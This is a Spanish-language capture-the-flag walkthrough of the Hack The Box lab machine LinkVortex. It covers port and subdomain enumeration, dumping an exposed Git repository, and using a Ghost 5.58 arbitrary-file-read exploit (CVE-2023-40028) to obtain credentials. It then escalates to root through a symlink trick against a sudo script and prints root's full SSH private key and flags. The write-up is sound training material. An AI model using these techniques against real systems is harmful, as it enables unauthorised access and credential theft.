---
hidden: true
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# LinkVortex

<figure><img src="../../../../.gitbook/assets/LinkVortex.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`LinkVortex`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.47 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 01:54 CET
Nmap scan report for 10.10.11.47
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.47
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página de `Nginx` y del servicio `SSH`.

En el resultado obtenido, verificamos también en  la página web está expuesto el archivo `robots.txt` en el cual también nos presentan algunas rutas de directorios.

```bash
❯ nmap -sCV -p22,80 10.10.11.47 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 01:56 CET
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up (0.080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   78.48 ms 10.10.16.1
2   39.16 ms linkvortex.htb (10.10.11.47)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.12 seconds
```

Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../../../.gitbook/assets/imagen (90).png" alt=""><figcaption></figcaption></figure>

Procederemos a añadir la siguiente entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep 10.10.11.47
10.10.11.47 linkvortex.htb
```

## Web Enumeration

A través de la herramienta `whatweb` revisaremos las tecnologías que utiliza el sitio web.

```bash
❯ whatweb http://linkvortex.htb
http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

Al ingresar a [http://linkvortex.htb](http://linkvortex.htb) verificamos a través de `Wappalyzer` las tecnologías que utiliza el sitio web. Verificamos que utiliza un CMS de `Ghost` en una versión 5.58, esta información nos puede ser útil más adelante en busca de CVE.

<figure><img src="../../../../.gitbook/assets/3574_vmware_P3M1y3jo2H.png" alt="" width="563"><figcaption></figcaption></figure>

Revisando las páginas que dispone el sitio web, verificamos que no logramos sacar ningún tipo de información relevante.

<figure><img src="../../../../.gitbook/assets/imagen (93).png" alt=""><figcaption></figcaption></figure>

Tal como habíamos descubierto con el escaneo de `Nmap`, el archivo `robots.txt` se encuentra expuesto en el sitio web. En este archivo nos indican rutas de directorios que podemos investigar más adelante.

<figure><img src="../../../../.gitbook/assets/imagen (95).png" alt=""><figcaption></figcaption></figure>

Al ingresar a [http://linkvortex.htb/ghost/](http://linkvortex.htb/ghost/) verificamos que nos pide credenciales de acceso.

<figure><img src="../../../../.gitbook/assets/imagen (97).png" alt=""><figcaption></figcaption></figure>

Revisaremos si el archivo `sitemap.xml` se encuentra público, en este archivo se encuentran las rutas de directorios y páginas edl sitio web. No logramos sacar ningún tipo de información interesante.

<figure><img src="../../../../.gitbook/assets/imagen (96).png" alt=""><figcaption></figcaption></figure>

### Subdomain Enumeration (fuzzing)

Procederemos a realizar una enumeración de posibles subdominios del sitio web, en este caso, el resultado obtenido nos muestran que todos los resultados nos devuelven `230 Chars`, lo cual parece que no nos interese este resultado.

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.linkvortex.htb" http://linkvortex.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000000001:   301        7 L      20 W       230 Ch      "index"                                                                                                                                                              
000000039:   301        7 L      20 W       230 Ch      "login"                                                                                                                                                              
000000003:   301        7 L      20 W       230 Ch      "download"                                                                                                                                                           
000000029:   301        7 L      20 W       230 Ch      "sitemap"                                                                                                                                                            
000000009:   301        7 L      20 W       230 Ch      "full"                                                                                                                                                               
000000027:   301        7 L      20 W       230 Ch      "2005"                                                                                                                                                               
000000007:   301        7 L      20 W       230 Ch      "serial" bas
```

Volveremos a lanzar el fuzzing con `wfuzz` evitando que nos muestren aquellos resultados que tengan `230 CH`, verificamos que logramos encontrar un subdominio llamado `dev`.

```bash
❯ wfuzz -c --hc=404,400 --hh=230 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.linkvortex.htb" http://linkvortex.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000000820:   200        115 L    255 W      2538 Ch     "dev" 
```

Procederemos a añadir esta nueva entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep 10.10.11.47
10.10.11.47 linkvortex.htb dev.linkvortex.htb
```

Procederemos a verificar el contenido del sitio web http://dev.linkvortex.htb y verificamos que nos encontramos con el siguiente resultado, aparentemente nada interesante.

<figure><img src="../../../../.gitbook/assets/imagen (94).png" alt=""><figcaption></figcaption></figure>

A traves de la herramienta de `dirsearch`, procederemos a realizar una enumeración de directorios. Una vez finalizado el resultado de la enumeración, nos encontramos con el siguiente resultado.

Al parecer, parece haber en el sitio web un directorio de un proyecto de Git.

{% hint style="info" %}
Git es un sistema de control de versiones distribuido, lo que significa que un clon local del proyecto es un repositorio de control de versiones completo. Estos repositorios locales plenamente funcionales permiten trabajar sin conexión o de forma remota con facilidad.

Los desarrolladores confirman su trabajo localmente y, a continuación, sincronizan la copia del repositorio con la del servidor. Este paradigma es distinto del control de versiones centralizado, donde los clientes deben sincronizar el código con un servidor antes de crear nuevas versiones.
{% endhint %}

```bash
❯ dirsearch -u dev.linkvortex.htb 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/LinkVortex/LinkVortex/content/reports/_dev.linkvortex.htb/_25-01-15_02-10-33.txt

Target: http://dev.linkvortex.htb/

[02:10:34] Starting: 
[02:10:36] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/
[02:10:36] 200 -   41B  - /.git/HEAD
[02:10:36] 200 -  620B  - /.git/hooks/
[02:10:36] 200 -  201B  - /.git/config
[02:10:36] 200 -  557B  - /.git/
[02:10:36] 200 -   73B  - /.git/description
[02:10:36] 200 -  402B  - /.git/info/
[02:10:36] 200 -  401B  - /.git/logs/
[02:10:36] 200 -  175B  - /.git/logs/HEAD
[02:10:36] 200 -  240B  - /.git/info/exclude
[02:10:36] 200 -  147B  - /.git/packed-refs
[02:10:36] 200 -  418B  - /.git/objects/
[02:10:36] 200 -  393B  - /.git/refs/
[02:10:36] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/
[02:10:36] 200 -  691KB - /.git/index
```

### Downloading a Git project with GitHack

Procederemos a descarganos todo el repositorio de `/.git/` a través de la siguiente herramienta: `GitHack`.

{% embed url="https://github.com/lijiejie/GitHack" %}

```bash
❯ python3 /opt/GitHack/GitHack.py http://dev.linkvortex.htb/.git/ 2>/dev/null
[+] Download and parse index file ...
...[snip]...
[+] ghost/core/core/server/api/endpoints/images.js
[+] ghost/core/core/server/api/endpoints/index.js
[+] ghost/core/core/server/api/endpoints/integrations.js
...[snip]...
```

Al verificar el resultado obtenido, comprobamos que disponemos de 2 archivos `Dockerfile.ghost` y `authentication.test.js`.

```bash
❯ tree
.
├── dev.linkvortex.htb
│   ├── Dockerfile.ghost
│   └── ghost
│       └── core
│           └── test
│               └── regression
│                   └── api
│                       └── admin
│                           └── authentication.test.js
└── index

8 directories, 3 files
```

Verificando el archivo `JS` que parece ser un archivo de autenticaciones, probaremos de revisar el contenido y filtrar si hay algún campo donde almacene contraseñas. Verificamos que obtenemos el siguiente resultado.

```bash
❯ cat dev.linkvortex.htb/ghost/core/test/regression/api/admin/authentication.test.js | grep password
            const password = 'OctopiFociPilfer45';
                        password,
            await agent.loginAs(email, password);
                        password: 'thisissupersafe',
                        password: 'thisissupersafe',
            const password = 'thisissupersafe';
                        password,
            await cleanAgent.loginAs(email, password);
                        password: 'lel123456',
                        password: '12345678910',
                        password: '12345678910',
...[snip]...
```

Procederemos nuevamente a acceder a [http://linkvortex.htb/ghost/#/signin](http://linkvortex.htb/ghost/#/signin) y probaremos de autenticarnos con el usuario `admin@linkvortex.htb` y las credenciales `OctopiFociPilfer45`.

<figure><img src="../../../../.gitbook/assets/imagen (98).png" alt="" width="433"><figcaption></figcaption></figure>

Verificamos que hemos logrado el acceso a la página web correctamente con las credenciales del usuario `admin`.

<figure><img src="../../../../.gitbook/assets/imagen (100).png" alt=""><figcaption></figcaption></figure>

## Initial Access

### Ghost Arbitrary File Read Exploit (CVE-2023-40028)

En el resultado obtenido de la enumeración de las tecnologías del sitio web, verificamos que el sitio web utilizaba un CMS de `Ghost 5.58`.&#x20;

Revisando posibles vulnerabilidades para esta versión, nos encontramos con el siguiente `CVE-2023-40028`.

{% hint style="danger" %}
Las versiones afectadas de este paquete son vulnerables a la Lectura de Archivos Arbitrarias que permite a los usuarios autenticados subir archivos que son enlaces de symlinks. Esto se puede explotar para realizar una lectura arbitraria de cualquier archivo en el sistema operativo del host.
{% endhint %}

{% embed url="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028" %}

Procederemos a clonarnos el repositorio en nuestro equipo atacante.

```bash
❯ git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028; cd Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
Clonando en 'Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 20 (delta 3), reused 9 (delta 2), pack-reused 0 (from 0)
Recibiendo objetos: 100% (20/20), 8.38 KiB | 1.67 MiB/s, listo.
Resolviendo deltas: 100% (3/3), listo.
```

Revisaremos el funcionamiento del exploit desde el mismo repositorio de GitHub.

<figure><img src="../../../../.gitbook/assets/imagen (91).png" alt=""><figcaption></figcaption></figure>

Al verificar como funciona el exploit, procederemos a explotar la vulnerabilidad y verificamos que hemos logrado leer el archivo `/etc/passwd`.

```bash
❯ ./CVE-2023-40028 -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45' -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

Teniendo en cuenta que podemos leer archivos locales del equipo víctima, después de revisar varios archivos típicos y no obtener ningún resultado esperado, volvimos al repositorio que nos descargamos de `Git`.

En este repositorio no revisamos en su momento el archivo `Dockerfile.ghost`. Verificamos que el contenido de este archivo indica que se ha realizado una copia de la configuración en la siguiente ruta `/var/lib/ghost/config.production.json`.

<pre class="language-bash"><code class="lang-bash">❯ tree
.
├── dev.linkvortex.htb
│   ├── Dockerfile.ghost
│   └── ghost
│       └── core
│           └── test
│               └── regression
│                   └── api
│                       └── admin
│                           └── authentication.test.js
└── index

8 directories, 3 files
<strong>
</strong><strong>❯ cat dev.linkvortex.htb/Dockerfile.ghost
</strong>FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
</code></pre>

Probaremos de listar el contenido de este archivo de configuración explotando el CVE que hemos encontrado. Verificamos que el archivo contiene las credenciales del usuario `bob@linkvortex.htb`.

```bash
❯ ./CVE-2023-40028 -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45' -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
Enter the file path to read (or type 'exit' to quit):
```

Procederemos a probar de conectarnos al equipo mediante `SSH`, verificamos que hemos logrado el acceso y obtenemos la flag de **user.txt`.`**

```bash
❯ sshpass -p 'fibber-talented-worth' ssh bob@10.10.11.47
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jan 15 02:05:51 2025 from 10.10.16.5
bob@linkvortex:~$ cat user.txt
b0c86a993693********************
```

## Privilege Escalation

Revisando si el usuario `bob` dispone de algún permiso de `sudoers`, verificamos que existe un binario inusual llamado `/opt/ghost/clean_symlink.sh`.

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Al revisar el contenido del script de Bash, verificamos que este script podría ser parte de un proceso automatizado para monitorear enlaces simbólicos y **aislar aquellos que apuntan a ubicaciones sensibles** como `/etc` o `/root`, asegurando así que **solo archivos seguros** se dejen pasar.

<pre class="language-bash"><code class="lang-bash">bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
<strong>#!/bin/bash
</strong>
QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
</code></pre>

Sabiendo el comportamiento del script, lo que realizaremos es crear un enlace simbólico del archivo `/root/root.txt` para un archivo `gzzcoo.txt`&#x20;

```bash
bob@linkvortex:~$ ln -s /root/root.txt gzzcoo.txt      
bob@linkvortex:~$ ln -s /home/bob/gzzcoo.txt gzzcoo.png
bob@linkvortex:~$ ls -l
total 4
lrwxrwxrwx 1 bob  bob 20 Jan 15 02:27 gzzcoo.png -> /home/bob/gzzcoo.txt
lrwxrwxrwx 1 bob  bob 14 Jan 15 02:27 gzzcoo.txt -> /root/root.txt
-rw-r----- 1 root bob 33 Jan 15 00:55 user.txt
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh gzzcoo.png
Link found [ gzzcoo.png ] , moving it to quarantine
Content:
6cbb92bb3649********************
```

Para obtener una shell como usuario `root` lo que realizamos es el mismo proceso anterior pero a través de la clave privada SSH del usuario `root`.&#x20;

```bash
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa gzzcoo2.txt
bob@linkvortex:~$ ln -s /home/bob/gzzcoo2.txt gzzcoo.png
bob@linkvortex:~$ ls -l
total 4
lrwxrwxrwx 1 bob  bob 21 Jan 19 15:17 gzzcoo.png -> /home/bob/gzzcoo2.txt
lrwxrwxrwx 1 bob  bob 17 Jan 19 15:17 gzzcoo2.txt -> /root/.ssh/id_rsa
-rw-r----- 1 root bob 33 Jan 19 15:14 user.txt
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh gzzcoo.png
Link found [ gzzcoo.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
bob@linkvortex:~$
```

Guardamos el contenido de la clave en un fichero `id_rsa`, le damos los permisos adecuados y al conectarnos como usuario `root`, verificamos la flag de **root.txt**

```bash
bob@linkvortex:~$ chmod 600 id_rsa 
bob@linkvortex:~$ ssh -i id_rsa root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# cat /root/root.txt 
1b6e7597655d8486eafb553990e62b8e
root@linkvortex:~#
```
